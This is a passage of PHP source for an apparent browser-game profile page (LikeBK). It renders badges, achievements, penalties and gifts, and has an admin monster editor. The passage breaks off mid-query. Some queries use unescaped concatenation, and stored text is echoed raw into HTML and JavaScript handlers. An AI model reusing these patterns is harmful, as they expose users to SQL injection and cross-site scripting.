					$mest = $mest[0]+1;
					if( $mest > 233 ) {
						$mest -= 233;
					}
					$ico[1] .= ' <a href="#"><img src="http://img.likebk.com/8mrt.png" onMouseOver="top.hi(this,\'<B>Участник Празднования 8 марта!</b>`'.date('Y',$o8ov['time']-345*86400).'<br>Персонаж занял '.$mest.' место!\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a> ';
				 }
				 $o1apov = mysql_fetch_array(mysql_query('SELECT * FROM `1quest` WHERE `time` > "'.time().'" AND `uid` = "'.$inf['id'].'" LIMIT 1'));
				 if(isset($o1apov['id'])) {
					$mest = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM `1quest` WHERE `id` < "'.$o1apov['id'].'" LIMIT 1'));
					$mest = $mest[0]+1;
					if( $mest > 395 ) {
						$mest -= 395;
					}elseif( $mest > 211 ) {
						$mest -= 211;
					}
					$ico[1] .= ' <a href="#"><img src="http://img.likebk.com/massfun.gif" onMouseOver="top.hi(this,\'<B>Участник 1 апреля!</b>`'.date('Y',$o1apov['time']-345*86400).'<br>Персонаж занял '.$mest.' место!\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a> ';
				 }
				 //сильвер
				 /*if($st['naemnik']>0) {
				 	echo '<img src="http://img.likebk.com/naim.gif" onMouseOver="top.hi(this,\'<b>Лицензия наемника</b><br>Участвует в рейтинге наемников\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"> ';
				 }*/
				 
				/*if($inf['activ'] == 0) {
					echo '<img src="http://img.likebk.com/realpers1.gif" onMouseOver="top.hi(this,\'<b>Реальный игрок</b><br>Уровень подтверждения: Персональные данные\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();">';
				}*/
				if( $inf['id'] == 574413 ) {
					$ico[1] .= '<img style="width: 35px; height: 25px;" src="http://img.likebk.com/md_5a940.png" onMouseOver="top.hi(this,\'<b>Главный редактор радио LIKEBK</b><br>\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();" />';
				}
				if($inf['id'] == 8286266 || $inf['id'] == 2015578 || $inf['id'] == 574413 || $inf['id'] == 36856066 || $inf['id'] == 2107277 || $inf['id'] == 74944397 ) {
						 $ico[1] .= '<img style="width: 35px; height: 25px;" src="http://img.likebk.com/i/didgej.png" onMouseOver="top.hi(this,\'<b>Диджей</b><br>\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();" />';
				}
				if($inf['id'] == "104853" || $inf['id'] == "581644" || $inf['id'] == "225195"){
					$ico[1] .= '<img style="width: 35px; height: 24px;" src="http://img.likebk.com/i/pal_good.gif" onMouseOver="top.hi(this,\'<b>За отличную работу в Ордене Света!</b><br>\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();" />';
				}

				 //«»
				$premium = mysql_fetch_array(mysql_query('SELECT * FROM `premium` WHERE `uid` = "'.$inf['id'].'" AND `time_delete` > "'.time().'"'));
				if($premium['type'] == 1){
						 $ico[1] .= ' <a href="buttons.php?premium=1" target="_blank"><img src="http://img.likebk.com/i/eff/bronze.png" onMouseOver="top.hi(this,\'<b>Премиум аккаунт:</b><br> '.$premium['name'].'\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a> ';
				}elseif($premium['type'] == 2){
						 $ico[1] .= ' <a href="buttons.php?premium=1" target="_blank"><img src="http://img.likebk.com/i/eff/silver.png" onMouseOver="top.hi(this,\'<b>Премиум аккаунт:</b><br> '.$premium['name'].'\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a> ';
				}elseif($premium['type'] == 3){
						 $ico[1] .= ' <a href="buttons.php?premium=1" target="_blank"><img src="http://img.likebk.com/i/eff/gold.png" onMouseOver="top.hi(this,\'<b>Премиум аккаунт:</b><br> '.$premium['name'].'\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a> ';
				}
				 $irep = mysql_fetch_array(mysql_query('SELECT * FROM `rep` WHERE `id` = "'.$inf['id'].'" LIMIT 1'));
				 if(isset($irep['id']))
				 {					 
					
					 //Храм знаний
					 if($irep['rep1']>9999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/znrune_3.gif" onMouseOver="top.hi(this,\'<b>Храм Знаний</b><br>Посвященный третьего круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }elseif($irep['rep1']>999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/znrune_2.gif" onMouseOver="top.hi(this,\'<b>Храм Знаний</b><br>Посвященный второго круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }elseif($irep['rep1']>99)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/znrune_1.gif" onMouseOver="top.hi(this,\'<b>Храм Знаний</b><br>Посвященный первого круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }
					 
					 //Алтарь крови
					 if($irep['rep2']>=1000)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/znbl_2.png" onMouseOver="top.hi(this,\'<b>Алтарь Крови</b><br>Посвященный второго круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }elseif($irep['rep2']>99)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/znbl_1.gif" onMouseOver="top.hi(this,\'<b>Алтарь Крови</b><br>Посвященный первого круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }
					 
					 //Излом хаоса
					 if($irep['repizlom']>99)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/iz_zn_ver10_1.gif" onMouseOver="top.hi(this,\'<b>Излом Хаоса</b><br>Аттестованный боец\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }
					
					 //capitalcity
					 if($irep['repcapitalcity']>24999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn1_2.gif" onMouseOver="top.hi(this,\'<b>Capital city</b><br>Рыцарь второго круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }elseif($irep['repcapitalcity']>9999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn1_1.gif" onMouseOver="top.hi(this,\'<b>Capital city</b><br>Рыцарь первого круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }
					 
					 //angelscity
					 if($irep['repangelscity']>24999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn2_2.gif" onMouseOver="top.hi(this,\'<b>Angels city</b><br>Рыцарь второго круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }elseif($irep['repangelscity']>9999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn2_1.gif" onMouseOver="top.hi(this,\'<b>Angels city</b><br>Рыцарь первого круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }
					 
					 //demonscity
					 if($irep['repdemonscity']>24999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn3_2.gif" onMouseOver="top.hi(this,\'<b>Demons city</b><br>Рыцарь второго круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }elseif($irep['repdemonscity']>9999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn3_1.gif" onMouseOver="top.hi(this,\'<b>Demons city</b><br>Рыцарь первого круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }
					 
					 //devilscity
					 if($irep['repdevilscity']>24999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn4_2.gif" onMouseOver="top.hi(this,\'<b>Devils city</b><br>Рыцарь второго круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }elseif($irep['repdevilscity']>9999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn4_1.gif" onMouseOver="top.hi(this,\'<b>Devils city</b><br>Рыцарь первого круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }
					 
					 //suncity
					 if($irep['repsuncity']>24999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn5_2.gif" onMouseOver="top.hi(this,\'<b>Suncity</b><br>Рыцарь второго круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }elseif($irep['repsuncity']>9999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn5_1.gif" onMouseOver="top.hi(this,\'<b>Suncity</b><br>Рыцарь первого круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }
					 
					 //emeraldscity
					 if($irep['repemeraldscity']>24999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn6_2.gif" onMouseOver="top.hi(this,\'<b>Emeralds city</b><br>Рыцарь второго круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }elseif($irep['repemeraldscity']>9999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn6_1.gif" onMouseOver="top.hi(this,\'<b>Emeralds city</b><br>Рыцарь первого круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }
					 
					 //sandcity
					 if($irep['repsandcity']>24999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn7_2.gif" onMouseOver="top.hi(this,\'<b>Sand city</b><br>Рыцарь второго круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }elseif($irep['repsandcity']>9999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn7_1.gif" onMouseOver="top.hi(this,\'<b>Sand city</b><br>Рыцарь первого круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }
					 
					 //mooncity
					 if($irep['repabandonedplain']>24999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn9_2.gif" onMouseOver="top.hi(this,\'<b>Гора</b><br>Рыцарь второго круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }elseif($irep['repabandonedplain']>9999)
					 {
						 $ico[1] .= '<a href="#"><img src="http://img.likebk.com/zn9_1.gif" onMouseOver="top.hi(this,\'<b>Гора</b><br>Рыцарь первого круга\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }
					 
					 //dungeon
				 }
			  			  
				function timeOut($ttm,$travm=false)
				{
				   if($travm==false){
				    $out = '';
					$time_still = $ttm;
					$tmp = floor($time_still/2592000);
					$id=0;
					if ($tmp > 0) 
					{ 
						$id++;
						if ($id<3) {$out .= $tmp." мес. ";}
						$time_still = $time_still-$tmp*2592000;
					}
					$tmp = floor($time_still/604800);
					if ($tmp > 0) 
					{ 
						$id++;
						if ($id<3) {$out .= $tmp." нед. ";}
						$time_still = $time_still-$tmp*604800;
					}
					$tmp = floor($time_still/86400);
					if ($tmp > 0) 
					{ 
						$id++;
						if ($id<3) {$out .= $tmp." дн. ";}
						$time_still = $time_still-$tmp*86400;
					}
					$tmp = floor($time_still/3600);
					if ($tmp > 0) 
					{ 
						$id++;
						if ($id<3) {$out .= $tmp." ч. ";}
						$time_still = $time_still-$tmp*3600;
					}
					$tmp = floor($time_still/60);
					if ($tmp > 0) 
					{ 
						$id++;
						if ($id<3) {$out .= $tmp." мин. ";}
					}
					if($out=='')
					{
						if($time_still<0)
						{
							$time_still = 0;
						}
						$out = $time_still.' сек.';
					}
					}else{
					}
					return $out;
				}
			  	if($inf['twink'] == 0) {
					$ar = mysql_fetch_array(mysql_query('SELECT * FROM `achiev` WHERE `uid` = "'.$inf['id'].'" LIMIT 1'));
					$ari = array(
						'',
						'Победа в физических боях',
						'Победы во всех боях',
						'Накопленные деньги',
						'Плавка уникальных рун',
						'Убийство пещерных монстров',
						'Побед в хаотичных боях',
						'Сделать подарок другим игрокам',
						'Получить подарки от других игроков',
						'Репутации в пещерах',
						'Нанести травмы противнику',
						'Поединки на Центральной Площади',
						'Лекарь',
						'Животновод',
						'Любитель смайлов',
						'Многоликий',
						'Убийца боссов',
						'Любитель зелий Воинского Искусства',
						'Любитель Амброзии',
						'Величайший воин',
						'Убийца Светлых',
						'Убийца Тёмных',
						'Убийца Нейтралов',
						'',
						'Преданность Свету',
						'Преданность Тьме',
						'Преданность Нейтралитету',
						'',
						'',
						'Любитель Хижины Искателей Приключений'
					);
					$ari2 = array(
						'',
						'Бронза',
						'Серебро',
						'Золото'
					);
					$i = 1;
					while( $i <= 29 ) {
						if($i != 23) {
							if( $ar['a'.$i.'lvl'] > 0 ) {
								$rng1 = $ari2[$ar['a'.$i.'lvl']];
								$ico[-1] .= '<img onMouseOver="top.hi(this,\'«<b>'.$ari[$i].'</b> - '.$rng1.'»\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();" height="33" src="http://img.likebk.com/achiev/a'.$i.'-'.$ar['a'.$i.'lvl'].'.png">';
							}
						}
						$i++;
					}
					
					$sud = array(446583=>true);
					$sud = '59387520
63373731
67670004
5772991
599491
33944649
64931487
72472934
68890907
25601936
2302828
95257233
15199728
60152772
9256925
362038
38281800
64980767
91005218
14891369
22048247
92805552
107177
56808464
52973272
2672276
87363
79317081
59153580
150561
709519
25071400
581644
3359024
86749567
4429613
11517335
61692801
55295651
53244820
59387520
69823706
11308026
446583
4645569
99656005
7701060
10505358
11021108
27211857
117356657
11915061
229411
26360663
6154584
89460420
56050099
45676013
41736098
274818
95622716
32406833
27228488
4938953
38831106
28846273
72520329
3458309
58963965
3071478
7039950
31468452
210714
106278451
56896596
24084509
15183127
1921007
2954832
30014669
101206499
3458309';
					
					$i = 0;
					$sud1 = explode('
',$sud);			
					$sud = array();
					while( $i < count($sud1) ) {
						$sud[$sud1[$i]] = true;
						$i++;
					}
					
					if( isset($sud[$inf['id']]) ) {
						$ico[1] .= '<img onMouseOver="top.hi(this,\'«<b>За участие в самом продолжительном бою в истории LikeBK!</b>»\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();" height="33" style="vertical-align:bottom" src="http://img.likebk.com/sudni.gif">';
					}
								
					if( $ico[-1] != '' ) {
						echo '<div style="padding-top:2px;">';
						echo '<div style="padding-bottom:2px;"><b>Игровые достижения:</b></div>';
						echo ''.$ico[-1].'</div>';
					}
				}
				
				if( $ico[1] != '' && $inf['twink'] == 0 ) {
					echo '<div style="padding-top:2px;">';
					echo '<div style="padding-bottom:2px;"><b>Медали и знаки отличия:</b></div>';
					echo ''.$ico[1].'</div>';
				}
				
				echo '<small>';
				if($inf['jail']>time())
				{
					echo '<br><img src="http://img.likebk.com/i/jail.gif"> Персонаж находится в заточении еще '.timeOut($inf['jail']-time()).' ';
				}
				if(isset($st['puti']))
				{
					echo '<br><img src="http://img.likebk.com/i/items/chains.gif"> Персонаж не может передвигаться еще '.timeOut($st['puti']-time()).' ';
				}
				if($inf['molch1']>time())
				{
					echo '<br><img src="http://img.likebk.com/i/sleeps'.$inf['sex'].'.gif"> На персонажа наложено заклятие молчания. Будет молчать еще '.timeOut($inf['molch1']-time()).' ';
				}
				if($inf['molch2']>time())
				{
					echo '<br><img src="http://img.likebk.com/i/fsleeps'.$inf['sex'].'.gif"> На персонажа наложено заклятие молчания на форуме. Будет молчать еще '.timeOut($inf['molch2']-time()).' ';
				}
				if($inf['info_delete'] > time() || $inf['info_delete'] == 1)
				{
					echo '<br><img src="http://img.likebk.com/stopinfo.png"> На персонажа наложено заклятие обезличивания.';
					if( $inf['info_delete'] > 1 ) {
						echo ' Будет обезличен еще '.timeOut($inf['info_delete']-time()).'';
					}
				}
				if($inf['banned'] > 0)
				{
					echo '<br><img src="http://img.likebk.com/block.png"> На персонажа наложено заклятие смерти.';
					if( $inf['info_delete'] > 1 ) {
						echo ' Еще '.timeOut($inf['info_delete']-time()).'';
					}
				}
				//Если у персонажа есть травмы, физ. и маг. травмы
				$sp = mysql_query('SELECT * FROM `eff_users` WHERE `uid` = "'.$inf['id'].'" AND (`id_eff` = "4" OR `id_eff` = "6") AND `delete` = "0" ORDER BY `id_eff` ASC LIMIT 6');
				while($pl = mysql_fetch_array($sp))
				{
					//$pln = array();
					//$pln = array(0=>$pln[0],1=>$pln[1]);
					echo '<br><img src="http://img.likebk.com/i/travma2.gif"> У персонажа - &quot;<b>'.$pl['name'].'</b>&quot; еще '.$u->timeOut($pl['timeUse']-time()+$pl['timeAce']);
				}
				
				//Персонаж ослаблен из-за смерти в бою, еще 4 мин. 24 сек. 
				if($inf['level']>=4)
				{
					$nn = 0;
					while($nn<count($st['effects']))
					{
						if($st['effects'][$nn]['id_eff']==5)
						{							
							
							$osl = mysql_fetch_array(mysql_query('SELECT `id2`,`actionTime` FROM `eff_main` WHERE `id2` = "5" LIMIT 1'));
							echo '<br><img src="http://img.likebk.com/i/travma2.gif"> Персонаж ослаблен из-за смерти в бою, еще '.timeOut($st['effects'][$nn]['timeUse']+$st['effects'][$nn]['timeAce']+$osl['actionTime']-time()).' ';
							$nn = count($st['effects'])+1;
						}
						$nn++;
					}
				}
				
				echo '</small>'; 
				
				$ugon = mysql_query('SELECT `uid` FROM `users_rating` ORDER BY `now` DESC LIMIT 3');
				$igon = 0;
				$igon2 = 0;
				while( $plugo = mysql_fetch_array($ugon)) {
					$igon++;
					if( $plugo['uid'] == $inf['id'] ) {
						$igon2 = $igon;
					}
				}
				
				if( $igon2 == 3 ) {
					$ico[3] = '<img src="http://img.likebk.com/bronze11.png" onMouseOver="top.hi(this,\'Третье место в рейтинге персонажей\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();">'.$ico[3];
				}
				if( $igon2 == 2 ) {
					$ico[3] = '<img src="http://img.likebk.com/silver11.png" onMouseOver="top.hi(this,\'Второе место в рейтинге персонажей\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();">'.$ico[3];
				}
				if( $igon2 == 1 ) {
					$ico[3] = '<img src="http://img.likebk.com/gold11.png" onMouseOver="top.hi(this,\'Первое место в рейтинге персонажей\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();">'.$ico[3];
				}
				
				if( $ico[3] != '' ) {
					echo '<div style="padding-top:20px;"><div style="padding-bottom:2px;">Достижения персонажа:</div>'.$ico[3].'</div>';
				}
				
				if( $ico[2] != '' ) {
					echo '<div style="padding-top:20px;"><div style="padding-bottom:2px;">Подвиги персонажа:</div>'.$ico[2].'</div>';
				}
				unset($ico);
				
			  	if(($inf['align']>=2 && $inf['align'] < 3 && ($inf['haos']>time() || $inf['haos']==1)) || $inf['banned']>0 || $inf['jail']>time())
				{
					$to = '';
					if($inf['align']>=2 && $inf['align'] < 3 && ($inf['haos']>time() || $inf['haos']==1))
					{
						$to = 'хаос';
					}
					if($inf['banned']>0)
					{
						if($to='')
						{
							$to = 'блок';
						}else{
							$to = $to.'/блок';
						}
					}
					$fm = mysql_fetch_array(mysql_query('SELECT * FROM `users_delo` WHERE `uid` = "'.$inf['id'].'" AND `hb`!=0 ORDER BY `id` DESC LIMIT 1'));
					if(!isset($fm['id'])) {
						$fm = mysql_fetch_array(mysql_query('SELECT * FROM `delo` WHERE `uid` = "'.$inf['id'].'" AND `hb`!=0 ORDER BY `id` DESC LIMIT 1'));
					}
					echo '<br><br>';
					if(isset($fm['id']))
					{
						$from = 'паладинов';
						if($fm['hd']==2)
						{
							$from = 'Ангелов';
						}elseif($fm['hd']==3)
						{
							$from = 'тарманов';
						}
						echo 'Сообщение от '.$from.' о причине отправки в '.$to.':<br>';
						//$fm['text'] = ltrim($fm['text'],"Ангел \&quot\;".$fm['login']."\&quot\; \<b\>сообщает\<\/b\>\:");
						echo '<font color="red" style="background-color:#fae0e0;"><b>'.$fm['text'].'</b></font><br>';
					}
					if($inf['align']>=2 && $inf['align'] < 3 && ($inf['haos']>time() || $inf['haos']==1))
					{
						if($inf['haos']==1)
						{
							echo 'Хаос <i>бессрочно</i>.';
						}else{
							echo 'Хаос еще <i>'.timeOut($inf['haos']-time()).'</i>';
						}
					}
				}
			  				
				//подарки
				if(($inf['info_delete']<time() && $inf['info_delete']!=1) || ($u->info['align']>1 && $u->info['align']<2 || $u->info['align']>3 && $u->info['align']<4 || $u->info['admin']>0 || $u->info['nadmin']>0)){
				$gs = array('','',''); $glim = 50; $i = 0;
				//$_GET['maxgift']=1;
				if(isset($_GET['maxgift']))
				{
					$glim = 1000;
				}
				$sp = mysql_query('SELECT `im`.*,`iu`.* FROM `items_users` AS `iu` LEFT JOIN `items_main` AS `im` ON (`im`.`id` = `iu`.`item_id`) WHERE (`im`.`type` = "28" OR `im`.`type` = "38" OR `im`.`type` = "63" OR `im`.`type` = "64") AND `iu`.`uid` = "'.$inf['id'].'" AND `iu`.`gift` != "" AND `iu`.`delete` = "0" AND `iu`.`inOdet` = "0" ORDER BY `iu`.`id` DESC LIMIT '.$glim);
				while($pl = mysql_fetch_array($sp))
				{
					if($pl['type'] == 28) {
						//Букеты
						$gs[2] .= ' <img src="http://img.likebk.com/i/items/'.$pl['img'].'" style="margin:1px 1px 0 0;display:block;float:left;cursor:pointer;" onClick="lookGift(event,0,\''.$pl['name'].'\',\''.$pl['img'].'\',\''.$pl['gtxt1'].'\',\''.$pl['gift'].'\');" title="'.$pl['gtxt1'].'
Подарок от '.strip_tags($pl['gift'],'').'" />';
					}elseif($pl['type'] == 63) {
						//открытки
						$gs[1] .= ' <img src="http://img.likebk.com/i/items/'.$pl['img'].'" style="margin:1px 1px 0 0;display:block;float:left;cursor:pointer;" onClick="lookGift(event,0,\''.$pl['name'].'\',\''.$pl['img'].'\',\''.$pl['gtxt1'].'\',\''.$pl['gift'].'\');" title="'.$pl['gtxt1'].'
Подарок от '.strip_tags($pl['gift'],'').'" />';
					}else{
						if(stristr($pl['data'], 'gift_id') == true) {
							$po = $u->lookStats($pl['data']);
							$pl_gift = $po['gift_id'];
							if( $pl_gift > 0 ) {
								$pl_gift = mysql_fetch_array(mysql_query('SELECT `name`,`img`,`id` FROM `users_gifts` WHERE `id` = "'.mysql_real_escape_string($pl_gift).'" LIMIT 1'));
								if( isset($pl_gift['id']) ) {
									//Именной подарок
									$pl['name'] = $pl_gift['name'];
									$pl['img'] = $pl_gift['img'];
								}
							}
						}
						//подарки
						$gs[0] .= ' <img src="http://img.likebk.com/i/items/'.$pl['img'].'" style="margin:1px 1px 0 0;display:block;float:left;cursor:pointer;" onClick="lookGift(event,0,\''.$pl['name'].'\',\''.$pl['img'].'\',\''.$pl['gtxt1'].'\',\''.$pl['gift'].'\');" title="'.$pl['gtxt1'].'
Подарок от '.strip_tags($pl['gift'],'').'" />';
					}
				}
				
				if($gs[0]!='' || $gs[1]!='' || $gs[2]!=''){
					if($gs[2] != '') {
						$gs[2] = '<tr><td style="padding-bottom:17px;">Букеты:<br>'.$gs[2].'</td></tr>';
					}
					echo '<br><br><table>'.$gs[2].'<tr><td>Подарки:<br>'.$gs[0].'</td></tr><tr><td style="padding-top:7px;">'.$gs[1].'</td></tr></table>';
					if(!isset($_GET['maxgift'])){
						echo '<small><a href="inf.php?'.$inf['id'].'&maxgift=1">Нажмите сюда, чтобы увидеть все подарки...</a></small>';
					}else{
						echo '<small><a href="inf.php?'.$inf['id'].'">Нажмите сюда, чтобы скрыть подарки</a></small>';
					}
				}
				
				}
				if( $inf['no_ip'] == 'trupojor' && $u->info['admin'] > 0 ) {
					if( isset($_GET['emonster']) ) {
						
						$monster = mysql_fetch_array(mysql_query('SELECT * FROM `aaa_monsters` WHERE `uid` = "'.mysql_real_escape_string($inf['id']).'" LIMIT 1'));
						
						if(isset($_POST['bot_sroom'])) {
							$monster['start_room'] = (int)$_POST['bot_sroom'];
							
							$monster['start_day'] = (int)$_POST['bot_sday'];
							$monster['start_dd'] = (int)$_POST['bot_sdd'];
							$monster['start_mm'] = (int)$_POST['bot_smm'];
							$monster['start_hh'] = (int)$_POST['bot_shh'];
							$monster['start_min'] = (int)$_POST['bot_smin'];
							
							$monster['back_day'] = (int)$_POST['bot_bday'];
							$monster['back_dd'] = (int)$_POST['bot_bdd'];
							$monster['back_mm'] = (int)$_POST['bot_bmm'];
							$monster['back_hh'] = (int)$_POST['bot_bhh'];
							$monster['back_min'] = (int)$_POST['bot_bmin'];
							
							$monster['start_text'] = $_POST['bot_stext'];
							$monster['back_text'] = $_POST['bot_btext'];
							$monster['win_text'] = $_POST['bot_wintext'];
							$monster['lose_text'] = $_POST['bot_losetext'];
							$monster['nich_text'] = $_POST['bot_nichtext'];
							
							$monster['win_back'] = $_POST['bot_winback'];
							$monster['time_restart'] = $_POST['bot_trs'];
							
							$monster['win_itm'] = $_POST['bot_winitm'];
							$monster['win_money1'] = $_POST['bot_winmoney1'];
							$monster['win_money2'] = $_POST['bot_winmoney2'];
							$monster['win_exp'] = $_POST['bot_winexp'];
							$monster['win_eff'] = $_POST['bot_wineff'];
							$monster['win_ico'] = $_POST['bot_winico'];
							
							$monster['lose_itm'] = $_POST['bot_loseitm'];
							$monster['lose_money1'] = $_POST['bot_losemoney1'];
							$monster['lose_money2'] = $_POST['bot_losemoney2'];
							$monster['lose_exp'] = $_POST['bot_loseexp'];
							$monster['lose_eff'] = $_POST['bot_loseeff'];
							$monster['lose_ico'] = $_POST['bot_loseico'];
							
							if( !isset($monster['id']) ) {
								mysql_query('INSERT INTO `aaa_monsters` (
									`uid`,`start_room`,`start_day`,`back_day`,`start_dd`,`start_mm`,`start_hh`,`start_min`,`back_min`,`back_dd`,`back_mm`,`back_hh`,
									`start_text`,`back_text`,`win_text`,`lose_text`,`win_money1`,`win_money2`,`lose_money`,`lose_money2`,`win_exp`,`lose_exp`,`win_itm`,
									`lose_itm`,`win_eff`,`lose_eff`,`win_ico`,`lose_ico`,`win_back`,`time_restart`,`nich_text`
								) VALUES (								
									"'.mysql_real_escape_string($inf['id']).'",
									"'.mysql_real_escape_string($monster['start_room']).'",
									"'.mysql_real_escape_string($monster['start_day']).'",
									"'.mysql_real_escape_string($monster['back_day']).'",
									"'.mysql_real_escape_string($monster['start_dd']).'",
									"'.mysql_real_escape_string($monster['start_mm']).'",
									"'.mysql_real_escape_string($monster['start_hh']).'",
									"'.mysql_real_escape_string($monster['start_min']).'",
									"'.mysql_real_escape_string($monster['back_min']).'",
									"'.mysql_real_escape_string($monster['back_dd']).'",
									"'.mysql_real_escape_string($monster['back_mm']).'",
									"'.mysql_real_escape_string($monster['back_hh']).'",
									"'.mysql_real_escape_string($monster['start_text']).'",
									"'.mysql_real_escape_string($monster['back_text']).'",
									"'.mysql_real_escape_string($monster['win_text']).'",
									"'.mysql_real_escape_string($monster['lose_text']).'",
									"'.mysql_real_escape_string($monster['win_money1']).'",
									"'.mysql_real_escape_string($monster['win_money2']).'",
									"'.mysql_real_escape_string($monster['lose_money']).'",
									"'.mysql_real_escape_string($monster['lose_money2']).'",
									"'.mysql_real_escape_string($monster['win_exp']).'",
									"'.mysql_real_escape_string($monster['lose_exp']).'",
									"'.mysql_real_escape_string($monster['win_itm']).'",
									"'.mysql_real_escape_string($monster['lose_itm']).'",
									"'.mysql_real_escape_string($monster['win_eff']).'",
									"'.mysql_real_escape_string($monster['lose_eff']).'",
									"'.mysql_real_escape_string($monster['win_ico']).'",
									"'.mysql_real_escape_string($monster['lose_ico']).'",
									"'.mysql_real_escape_string($monster['win_back']).'",
									"'.mysql_real_escape_string($monster['time_restart']).'",
									"'.mysql_real_escape_string($monster['nich_text']).'"
								) ');
							}else{
								mysql_query('UPDATE `aaa_monsters` SET
									`uid` = "'.mysql_real_escape_string($inf['id']).'",
									`start_room` = "'.mysql_real_escape_string($monster['start_room']).'",
									`start_day` = "'.mysql_real_escape_string($monster['start_day']).'",
									`back_day` = "'.mysql_real_escape_string($monster['back_day']).'",
									`start_dd` = "'.mysql_real_escape_string($monster['start_dd']).'",
									`start_mm` = "'.mysql_real_escape_string($monster['start_mm']).'",
									`start_hh` = "'.mysql_real_escape_string($monster['start_hh']).'",
									`start_min` = "'.mysql_real_escape_string($monster['start_min']).'",
									`back_min` = "'.mysql_real_escape_string($monster['back_min']).'",
									`back_dd` = "'.mysql_real_escape_string($monster['back_dd']).'",
									`back_mm` = "'.mysql_real_escape_string($monster['back_mm']).'",
									`back_hh` = "'.mysql_real_escape_string($monster['back_hh']).'",
									`start_text` = "'.mysql_real_escape_string($monster['start_text']).'",
									`back_text` = "'.mysql_real_escape_string($monster['back_text']).'",
									`win_text` = "'.mysql_real_escape_string($monster['win_text']).'",
									`lose_text` = "'.mysql_real_escape_string($monster['lose_text']).'",
									`win_money1` = "'.mysql_real_escape_string($monster['win_money1']).'",
									`win_money2` = "'.mysql_real_escape_string($monster['win_money2']).'",
									`lose_money` = "'.mysql_real_escape_string($monster['lose_money']).'",
									`lose_money2` = "'.mysql_real_escape_string($monster['lose_money2']).'",
									`win_exp` = "'.mysql_real_escape_string($monster['win_exp']).'",
